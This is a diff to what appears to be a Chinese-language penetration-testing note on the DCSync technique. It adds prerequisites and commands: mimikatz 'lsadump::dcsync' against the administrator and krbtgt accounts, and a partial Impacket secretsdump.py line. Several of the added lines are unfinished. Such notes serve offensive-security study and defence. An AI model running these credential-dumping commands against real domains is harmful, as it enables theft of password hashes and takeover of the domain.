@@ -6,11 +6,11 @@ description: 横向移动 / 滥用身份验证 /
 
 ## 先决条件
 
-*
-
-
-
-
+* 需要获取到目标域内一个有效的域账户
+* 该账户需要有足够高的权限，因为需要模拟域控之间的数据同步行为
+  * Administrators组成员
+  * 域管理员组成员
+* 需要能够与目标域内的域控建立通信
 
 ## 常用工具
 
@@ -19,7 +19,12 @@ description: 横向移动 / 滥用身份验证 /
 ```powershell
 mimikatz.exe
 # 指定要同步的目标账户
-lsadump::dcsync / user:administrator
+lsadump::dcsync /user:administrator
+lsadump::dcsync /user:krbtgt
+lsadump::dcsync / 
+# 获取Hash NTLM字段的值
+
+# 
 ```
 
 ### Impacket
@@ -27,7 +32,7 @@ lsadump::dcsync / user:administrator
 * 常用脚本：**secretsdump.py**
 
 ```bash
-// Some code
+python3 secretsdump.py 
 ```
 
 ### Powershell
